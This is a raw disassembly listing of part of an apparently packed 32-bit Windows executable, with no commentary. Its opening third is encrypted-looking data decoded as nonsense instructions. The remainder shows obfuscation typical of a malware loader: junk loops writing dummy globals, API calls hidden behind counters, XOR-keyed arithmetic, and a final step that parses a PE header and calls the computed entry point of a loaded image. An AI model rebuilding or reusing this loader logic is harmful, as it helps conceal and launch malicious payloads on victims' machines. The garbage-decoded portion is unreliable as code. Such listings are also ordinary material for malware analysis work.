  408cf7:	das    
  408cf8:	hlt    
  408cf9:	outs   dx,BYTE PTR ds:[esi]
  408cfa:	xor    ecx,edi
  408cfc:	and    dl,BYTE PTR [ecx+0x15dcf8c7]
  408d02:	xor    dl,BYTE PTR [esi+0x1cbb00c8]
  408d08:	cmp    esi,DWORD PTR [ecx-0x78713184]
  408d0e:	psubusb mm7,QWORD PTR [edx]
  408d11:	jne    0x408ccc
  408d13:	je     0x408d6c
  408d15:	add    bl,ch
  408d17:	sbb    bh,BYTE PTR [ecx]
  408d19:	pop    eax
  408d1a:	(bad)  
  408d1b:	push   ss
  408d1c:	mov    al,0x64
  408d1e:	jmp    0x8beec055
  408d23:	aam    0xf
  408d25:	ret    0xbcbc
  408d28:	in     al,0xea
  408d2a:	pop    esi
  408d2b:	cld    
  408d2c:	mov    eax,ds:0x37f0006e
  408d31:	adc    ebx,DWORD PTR [edx-0x459e9a19]
  408d37:	enter  0x8246,0x32
  408d3b:	iret   
  408d3c:	jle    0x408d18
  408d3e:	push   0x2247c532
  408d43:	(bad)  
  408d44:	pop    esi
  408d45:	dec    eax
  408d46:	lds    edi,FWORD PTR [ebp+0x23]
  408d49:	fisttp DWORD PTR [edi+eiz*2+0x50]
  408d4d:	mov    edi,fs
  408d4f:	ret    0x33a4
  408d52:	adc    DWORD PTR [esi],edx
  408d54:	cmp    DWORD PTR [ebx+0x7f0f4ef2],ecx
  408d5a:	enter  0x48bd,0x5e
  408d5e:	sahf   
  408d5f:	js     0x408d7c
  408d61:	push   0x95800316
  408d66:	in     al,0xb5
  408d68:	popf   
  408d69:	ret    0xf050
  408d6c:	jge    0x408de1
  408d6e:	dec    ebp
  408d6f:	jmp    0xea60:0xd3c1f69b
  408d76:	pusha  
  408d77:	rol    DWORD PTR [ebx],0xd7
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	pop    ss
  408dab:	pop    DWORD PTR [eax]
  408dad:	add    DWORD PTR [ecx-0x7581812f],esi
  408db3:	jg     0x408e33
  408db5:	jle    0x408dea
  408db7:	sbb    al,0x1f
  408db9:	fdivr  QWORD PTR [eiz*1+0x74e6b165]
  408dc0:	add    ebx,DWORD PTR [ecx]
  408dc2:	dec    ebp
  408dc3:	test   al,0x83
  408dc5:	in     eax,dx
  408dc6:	lea    edi,fs:[ebp-0x5eae6295]
  408dcd:	xabort 0x63
  408dd0:	pop    ebp
  408dd1:	(bad)  
  408dd2:	sbb    ebp,ecx
  408dd4:	push   0x8a98186c
  408dd9:	push   ss
  408dda:	cmp    bl,ch
  408ddc:	jb     0x408e59
  408dde:	jo     0x408d6e
  408de0:	jecxz  0x408d9e
  408de2:	pop    edi
  408de3:	ss inc edi
  408de5:	bound  ebp,QWORD PTR [ebp+0x46029327]
  408deb:	aas    
  408dec:	cmp    BYTE PTR [ecx+0x5e],dh
  408def:	jmp    0x7692:0x48171d2f
  408df6:	rcl    bl,1
  408df8:	dec    esp
  408df9:	jle    0x408e77
  408dfb:	sbb    DWORD PTR [ecx-0x7c],edx
  408dfe:	ret    0xfb0c
  408e01:	ficom  DWORD PTR [ebx+0x48]
  408e04:	cmc    
  408e05:	dec    ebx
  408e06:	mov    edx,0xcda4e8be
  408e0b:	jne    0x408e7a
  408e0d:	retf   0x8981
  408e10:	sub    bl,0x5c
  408e13:	inc    edx
  408e14:	mov    edx,0x8b99faee
  408e19:	repnz mov WORD PTR gs:[edi+0x5bc32e48],gs
  408e21:	mov    eax,ds:0x199300a6
  408e26:	jns    0x408e00
  408e28:	ds jmp 0xfd202f41
  408e2e:	lods   al,BYTE PTR ds:[esi]
  408e2f:	call   0x73cf:0x33d0dff0
  408e36:	mov    esi,0xa5f21309
  408e3b:	jl     0x408e95
  408e3d:	neg    BYTE PTR [ebp-0x16]
  408e40:	push   edx
  408e41:	and    DWORD PTR [esi-0x43],edi
  408e44:	dec    edi
  408e45:	popf   
  408e46:	imul   esp,ebp,0x9c4902ac
  408e4c:	xchg   esi,eax
  408e4d:	ins    BYTE PTR es:[edi],dx
  408e4e:	sub    ecx,DWORD PTR ds:0xf6a3c742
  408e54:	pop    ebx
  408e55:	inc    esi
  408e56:	cmp    cl,dh
  408e58:	mov    al,0xdd
  408e5a:	add    eax,ecx
  408e5c:	or     al,0xdd
  408e5e:	and    al,0xa4
  408e60:	test   al,0x78
  408e62:	shl    BYTE PTR [edi+0x2d],0xee
  408e66:	xchg   ecx,eax
  408e67:	stos   BYTE PTR es:[edi],al
  408e68:	dec    ebx
  408e69:	jge    0x408e1e
  408e6b:	xor    cl,BYTE PTR ds:0x6c80f4f0
  408e71:	out    dx,al
  408e72:	cmp    edi,esi
  408e74:	cs pop esi
  408e76:	pop    ebp
  408e77:	inc    DWORD PTR [ecx-0x62c2367b]
  408e7d:	out    0x6d,eax
  408e7f:	push   edx
  408e80:	mov    dh,0x86
  408e82:	je     0x408edf
  408e84:	cmp    DWORD PTR [ebx-0x33219a88],edx
  408e8a:	leave  
  408e8b:	test   al,0x48
  408e8d:	pop    ebp
  408e8e:	mov    edx,0x89f298b
  408e93:	mov    ecx,0xcb94d2ed
  408e98:	dec    eax
  408e99:	inc    esp
  408e9a:	pop    esp
  408e9b:	push   ecx
  408e9c:	cmp    BYTE PTR [ecx],al
  408e9e:	pop    esp
  408e9f:	pop    edi
  408ea0:	xor    al,0x29
  408ea2:	pop    ss
  408ea3:	adc    al,0x81
  408ea5:	xchg   ecx,eax
  408ea6:	cs in  eax,0x8d
  408ea9:	or     eax,0xc3836dd6
  408eae:	inc    edx
  408eaf:	jmp    0x408e82
  408eb1:	xor    BYTE PTR [edi],dl
  408eb3:	mov    BYTE PTR [esi+0x10],0xc6
  408eb7:	or     DWORD PTR [edi+eax*8+0x51],edx
  408ebb:	out    0xbf,al
  408ebd:	retf   0xadbf
  408ec0:	imul   esp,ebp,0x7e1456d8
  408ec6:	adc    eax,0x361ce8c5
  408ecb:	lahf   
  408ecc:	aam    0xb4
  408ece:	inc    ebp
  408ecf:	loop   0x408ee4
  408ed1:	es out dx,eax
  408ed3:	shr    DWORD PTR [edi-0x2f],1
  408ed6:	cmp    al,0xa8
  408ed8:	push   ebx
  408ed9:	adc    eax,0x5c21946b
  408ede:	push   ebp
  408edf:	and    al,0xac
  408ee1:	fadd   DWORD PTR [eax+0x34]
  408ee4:	cmp    BYTE PTR [ebp+0x38],al
  408ee7:	pop    es
  408ee8:	jnp    0x408e83
  408eea:	xchg   esp,eax
  408eeb:	jmp    0x408efb
  408eed:	fwait
  408eee:	aad    0x24
  408ef0:	ins    DWORD PTR es:[edi],dx
  408ef1:	mov    ebp,0x56b3cc0a
  408ef6:	pushf  
  408ef7:	pop    ecx
  408ef8:	mov    dh,0x48
  408efa:	mov    BYTE PTR [esi],dl
  408efc:	sub    al,0xc9
  408efe:	xor    BYTE PTR [edi+0x18],0xa7
  408f02:	dec    ecx
  408f03:	xchg   DWORD PTR [ebx+0x46],esp
  408f06:	ja     0x408f24
  408f08:	es dec ebx
  408f0a:	xchg   esp,eax
  408f0b:	js     0x408f2d
  408f0d:	pop    ebp
  408f0e:	push   ecx
  408f0f:	and    DWORD PTR ds:0xe52f96a0,esi
  408f15:	or     BYTE PTR [edi-0x4d74df92],ch
  408f1b:	jmp    0x8410:0xc17d5f20
  408f22:	out    0x4,al
  408f24:	mov    esp,0xb8b3c6f2
  408f29:	xor    dh,al
  408f2b:	daa    
  408f2c:	sahf   
  408f2d:	pop    esi
  408f2e:	xchg   BYTE PTR [ecx+ecx*1+0xd],bh
  408f32:	dec    esp
  408f33:	retf   
  408f34:	pusha  
  408f35:	into   
  408f36:	hlt    
  408f37:	mov    ecx,0xe596f60b
  408f3c:	push   cs
  408f3d:	in     eax,dx
  408f3e:	inc    ecx
  408f3f:	imul   eax,DWORD PTR [eax-0x6305e858],0xffffff94
  408f46:	push   ecx
  408f47:	lods   eax,DWORD PTR ds:[esi]
  408f48:	jl     0x408f78
  408f4a:	mov    ebx,DWORD PTR [ebp-0x8]
  408f4d:	xor    edx,eax
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	iret   
  408f61:	cdq    
  408f62:	gs xor ch,cl
  408f65:	fistp  QWORD PTR [esi+0x7e]
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408f33
  408f6d:	inc    ebp
  408f6e:	or     DWORD PTR [ecx+edi*8+0x11],edi
  408f72:	ret    0xa33f
  408f75:	lock xchg edi,eax
  408f77:	aam    0xcb
  408f79:	inc    DWORD PTR [edi+0x35a03e2a]
  408f7f:	arpl   di,bx
  408f81:	jle    0x408f07
  408f83:	das    
  408f84:	adc    edi,esp
  408f86:	mov    dh,0x31
  408f88:	and    BYTE PTR [ebp+ecx*8-0x5a3970c3],bh
  408f8f:	int    0x6d
  408f91:	adc    BYTE PTR [ecx-0x712609d2],cl
  408f97:	shl    DWORD PTR [edx],cl
  408f99:	int3   
  408f9a:	mov    edx,0x400fea56
  408f9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fa0:	mov    eax,ds:0x7da3c1d5
  408fa5:	lods   al,BYTE PTR ds:[esi]
  408fa6:	into   
  408fa7:	mov    esp,0xb51978e7
  408fac:	pop    es
  408fad:	add    al,0xdf
  408faf:	aad    0xcb
  408fb1:	lahf   
  408fb2:	inc    esp
  408fb3:	jmp    0x38b3:0x509e8120
  408fba:	pop    edx
  408fbb:	mov    ebx,0x6503f84a
  408fc0:	mov    bh,0x27
  408fc2:	fdiv   st,st(0)
  408fc4:	jmp    0x3e59:0xdc9d866
  408fcb:	mov    eax,0xddeb61e3
  408fd0:	cs (bad) 
  408fd2:	icebp  
  408fd3:	or     al,0xaa
  408fd5:	mov    bh,bl
  408fd7:	ret    0x664c
  408fda:	adc    eax,0x21320c8d
  408fdf:	nop
  408fe0:	inc    eax
  408fe1:	pop    esi
  408fe2:	mov    edx,0xbd4a72d3
  408fe7:	adc    eax,0xca51449b
  408fec:	cld    
  408fed:	in     eax,0x41
  408fef:	xchg   esp,eax
  408ff0:	adc    al,BYTE PTR [esi]
  408ff2:	loop   0x408fb8
  408ff4:	shr    DWORD PTR [esi-0x3f9cc1db],1
  408ffa:	fstp   TBYTE PTR [eax]
  408ffc:	stc    
  408ffd:	into   
  408ffe:	or     DWORD PTR [ebp-0x4af08a0e],0x57
  409005:	(bad)  
  409006:	clc    
  409007:	or     BYTE PTR [esi-0x3a3b968f],al
  40900d:	xor    BYTE PTR [ecx],cl
  40900f:	mov    bh,0xa2
  409011:	xchg   ecx,eax
  409012:	leave  
  409013:	inc    edx
  409014:	sbb    eax,0xe19edc55
  409019:	adc    eax,0xd5624a60
  40901e:	push   edi
  40901f:	sbb    eax,0x8ad7c42c
  409024:	mov    eax,ds:0xa3684b38
  409029:	ror    DWORD PTR [edi],0xe0
  40902c:	out    0x7b,eax
  40902e:	jns    0x408ffd
  409030:	or     dh,ah
  409032:	and    ebp,eax
  409034:	push   ecx
  409035:	sbb    BYTE PTR [eax-0x69],bl
  409038:	xor    edi,DWORD PTR ds:0x73d9df69
  40903e:	adc    al,0x7a
  409040:	retf   0x6b58
  409043:	hlt    
  409044:	jp     0x409023
  409046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409047:	add    BYTE PTR [edx+eax*1+0x4919e9c7],bh
  40904e:	test   al,0x78
  409050:	push   ds
  409051:	mov    ds:0x658660f1,al
  409056:	dec    esp
  409057:	push   ebx
  409058:	(bad)  
  409059:	jle    0x409038
  40905b:	idiv   DWORD PTR [ebp+0x42]
  40905e:	or     ah,BYTE PTR [esi-0xf]
  409061:	jo     0x409067
  409063:	push   ss
  409064:	mov    al,ds:0x3912222b
  409069:	ja     0x409079
  40906b:	dec    eax
  40906c:	call   FWORD PTR [esi+ebx*1+0x4831e6d0]
  409073:	add    dl,ch
  409075:	xchg   esp,eax
  409076:	xor    dl,BYTE PTR ds:[ebx-0x23d806f2]
  40907d:	inc    esp
  40907e:	popf   
  40907f:	add    eax,0x61336cba
  409084:	js     0x4090cd
  409086:	and    edx,esp
  409088:	dec    esp
  409089:	cli    
  40908a:	mov    ch,0xd6
  40908c:	dec    esp
  40908d:	inc    esp
  40908e:	mov    WORD PTR [esi+0x7e32fc29],ss
  409094:	repz fdiv DWORD PTR [ecx-0x1f]
  409098:	push   ebx
  409099:	jp     0x4090df
  40909b:	neg    BYTE PTR [eax-0x6f]
  40909e:	pushf  
  40909f:	psubsb mm5,QWORD PTR [ebx+0x2f]
  4090a3:	cmc    
  4090a4:	push   esp
  4090a5:	xchg   DWORD PTR [ecx-0x27b774eb],eax
  4090ab:	push   ecx
  4090ac:	repnz stos BYTE PTR es:[edi],al
  4090ae:	xor    DWORD PTR [eax+0x35ad7131],0xaa77b123
  4090b8:	scas   eax,DWORD PTR es:[edi]
  4090b9:	(bad)  
  4090ba:	mov    ecx,0x52f6afc3
  4090bf:	jnp    0x409082
  4090c1:	(bad)  
  4090c2:	pop    ds
  4090c3:	arpl   WORD PTR es:[eax+0x3b],di
  4090c7:	xchg   esp,eax
  4090c8:	sar    BYTE PTR [eax-0x8],cl
  4090cb:	fimul  DWORD PTR [esi+edx*2+0x46]
  4090cf:	pop    ebp
  4090d0:	cdq    
  4090d1:	xor    al,0x79
  4090d3:	xor    BYTE PTR [esi+0x19],dh
  4090d6:	xor    DWORD PTR [eax+0x2eb2a9e0],esi
  4090dc:	mov    cl,0x3c
  4090de:	shl    BYTE PTR [edi],cl
  4090e0:	jno    0x4090e5
  4090e2:	pop    ebx
  4090e3:	inc    eax
  4090e4:	aam    0x73
  4090e6:	imul   esi,DWORD PTR [edi-0x74],0xe9264385
  4090ed:	sti    
  4090ee:	xor    ecx,esp
  4090f0:	lds    esp,FWORD PTR [ebx]
  4090f2:	out    dx,al
  4090f3:	dec    ebp
  4090f4:	out    0x71,eax
  4090f6:	dec    esp
  4090f7:	and    dh,bl
  4090f9:	imul   edi,DWORD PTR [edi+0x66d4dbfc]
  409100:	add    edx,ecx
  409102:	imul   edx,ebx
  409105:	cmp    edx,edi
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42e8b7
  40911f:	and    DWORD PTR ds:0x43035b,0x4302bd
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42ec5b,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x430363,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e658,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42e8f7
  40916b:	sbb    DWORD PTR ds:0x4302c1,0x4302f1
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42ec4b,0x624a
  409184:	call   DWORD PTR ds:0x42e8bf
  40918a:	adc    DWORD PTR ds:0x42e640,0x4302dd
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x4302d1,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x4302b5,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x4302ed,0x42e654
  4091c4:	call   DWORD PTR ds:0x42e963
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e648
  4091d6:	and    DWORD PTR ds:0x4302d9,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x4302b9,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42ec5b,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42ec5b,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e863
  409219:	mov    ecx,DWORD PTR ds:0x42ec5b
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42ec5b,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ec63,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42ec5f
  409243:	sbb    eax,DWORD PTR ds:0x42ec5b
  409249:	mov    ds:0x42ec5f,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42ec5b
  409261:	and    DWORD PTR ds:0x42e63c,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x4302d5,0x430357
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e64c,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x4302d5,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42ec4b,0x430367
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42ec4b,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x4302c9,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x4302d9,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ec63,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e648,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x4302b5,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e87f
  40930f:	adc    DWORD PTR ds:0x42ec5f,0x42e64c
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x4302d5,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x4302d1,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x4302d1
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x4302d1,ecx
  409352:	cmp    DWORD PTR ds:0x4302d1,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x4302d1,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e867
  409375:	cmp    DWORD PTR ds:0x4302d1,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x4302d1
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x4302d1,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42ec4b
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e7e7
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x430353,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x43036b,0x17
  4093b9:	cmp    DWORD PTR ds:0x43036b,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x43036b,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e86b
  4093df:	cmp    DWORD PTR ds:0x43036b,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x43036b
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x43036b,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x43036b
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x43036b,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x43035f,0x10
  409415:	cmp    DWORD PTR ds:0x43035f,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x43035f,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e86f
  409438:	mov    ecx,DWORD PTR ds:0x43035f
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x43035f,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x4302e1
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x4302e9,0x16
  409461:	cmp    DWORD PTR ds:0x4302e9,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x4302e9,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e873
  409481:	mov    ecx,DWORD PTR ds:0x4302e9
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x4302e9,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42ec4f,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42ec4f
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42ec4f,ecx
  4094b7:	cmp    DWORD PTR ds:0x42ec4f,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42ec4f,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e77b
  4094d6:	push   0x42e725
  4094db:	call   DWORD PTR ds:0x42eaab
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x4302d1,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x43036b,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ec63,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x4302e9,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x430363,0x4302f1
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x4302b9,0x1e
  40953f:	cmp    DWORD PTR ds:0x4302b9,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x4302b9,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e65c
  409566:	call   DWORD PTR ds:0x42e877
  40956c:	mov    eax,ds:0x4302b9
  409571:	dec    eax
  409572:	mov    ds:0x4302b9,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430309
  409582:	mov    eax,ds:0x430393
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x43034f,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e658,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x4302c1,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x4302c1
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x4302c1,edx
  4095e8:	cmp    DWORD PTR ds:0x4302c1,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e74d
  409617:	call   DWORD PTR ds:0x42e87b
  40961d:	cmp    DWORD PTR ds:0x4302c1,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e648,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e648
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e648,ecx
  40964a:	cmp    DWORD PTR ds:0x42e648,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42eaaf
  409672:	cmp    DWORD PTR ds:0x42e648,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
